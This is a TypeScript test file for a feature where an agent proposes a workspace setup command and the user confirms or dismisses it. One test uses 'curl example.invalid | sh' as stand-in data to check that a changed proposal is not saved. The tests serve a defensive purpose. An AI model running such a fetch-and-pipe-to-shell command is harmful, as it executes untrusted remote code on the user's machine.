import { beforeEach, describe, expect, it, vi } from "vitest";
import { decideProposal, proposedSetup, settleProposal } from "./profile";

const mocks = vi.hoisted(() => ({ api: vi.fn() }));
vi.mock("../net/api", () => ({ api: mocks.api }));

const stored = {
  setup_command: "make deps",
  pending_setup_command: "npm ci",
  laptop_only: ["xcodebuild"],
  deferred: ["open Simulator.app"],
  missing_environment: ["API_BASE"],
  future_field: { kept: true },
};

describe("a proposed setup command", () => {
  it("is shown only when an agent proposed one", () => {
    expect(proposedSetup({ setup_command: null, pending_setup_command: "npm ci", laptop_only: [], deferred: [], missing_environment: [] })).toBe("npm ci");
    for (const pending of [undefined, null, "", "   "]) {
      expect(proposedSetup({ setup_command: "make", pending_setup_command: pending, laptop_only: [], deferred: [], missing_environment: [] })).toBeNull();
    }
    expect(proposedSetup(null)).toBeNull();
  });

  it("confirming saves exactly the shown command and keeps every other field", () => {
    expect(decideProposal(stored, "npm ci", "confirm")).toEqual({ ...stored, setup_command: "npm ci", pending_setup_command: null });
  });

  it("dismissing clears only the proposal", () => {
    expect(decideProposal(stored, "npm ci", "dismiss")).toEqual({ ...stored, pending_setup_command: null });
  });

  it("never applies a decision to a proposal the user did not see", () => {
    for (const decision of ["confirm", "dismiss"] as const) {
      expect(decideProposal(stored, "npm install", decision)).toBeNull();
      expect(decideProposal({ ...stored, pending_setup_command: undefined }, "npm ci", decision)).toBeNull();
    }
  });
});

describe("saving the decision", () => {
  beforeEach(() => mocks.api.mockReset());
  const noWait = () => Promise.resolve();

  it("reads the stored profile fresh and writes the whole of it back", async () => {
    mocks.api.mockResolvedValueOnce(Response.json(stored)).mockResolvedValueOnce(new Response(null, { status: 204 }));
    await expect(settleProposal("w-1", "npm ci", "confirm", noWait)).resolves.toBe("saved");
    const [[readPath, read], [writePath, write]] = mocks.api.mock.calls;
    expect(readPath).toBe("/pro/profile?workspace_id=w-1");
    expect(read.method).toBeUndefined();
    expect(writePath).toBe(readPath);
    expect(write.method).toBe("PUT");
    expect(JSON.parse(write.body)).toEqual({ ...stored, setup_command: "npm ci", pending_setup_command: null });
  });

  it("writes nothing when the proposal changed since it was shown", async () => {
    mocks.api.mockResolvedValueOnce(Response.json({ ...stored, pending_setup_command: "curl example.invalid | sh" }));
    await expect(settleProposal("w-1", "npm ci", "confirm", noWait)).resolves.toBe("changed");
    expect(mocks.api).toHaveBeenCalledOnce();
  });

  it("retries a save refused mid-copy from a fresh read, then gives up", async () => {
    const busy = () => Response.json({ error: "busy" }, { status: 409 });
    mocks.api
      .mockResolvedValueOnce(Response.json(stored)).mockResolvedValueOnce(busy())
      .mockResolvedValueOnce(Response.json(stored)).mockResolvedValueOnce(new Response(null, { status: 204 }));
    const wait = vi.fn(noWait);
    await expect(settleProposal("w-1", "npm ci", "dismiss", wait)).resolves.toBe("saved");
    expect(wait).toHaveBeenCalledOnce();
    expect(mocks.api).toHaveBeenCalledTimes(4);

    mocks.api.mockReset();
    mocks.api.mockImplementation(async (_path: string, init: RequestInit = {}) => init.method === "PUT" ? busy() : Response.json(stored));
    await expect(settleProposal("w-1", "npm ci", "dismiss", noWait)).rejects.toThrow();
    expect(mocks.api.mock.calls.filter(([, init]) => init.method === "PUT").length).toBeLessThanOrEqual(4);
  });

  it("does not retry any other refusal", async () => {
    mocks.api.mockResolvedValueOnce(Response.json(stored)).mockResolvedValueOnce(Response.json({ error: "denied" }, { status: 400 }));
    await expect(settleProposal("w-1", "npm ci", "confirm", noWait)).rejects.toThrow();
    expect(mocks.api).toHaveBeenCalledTimes(2);
  });
});
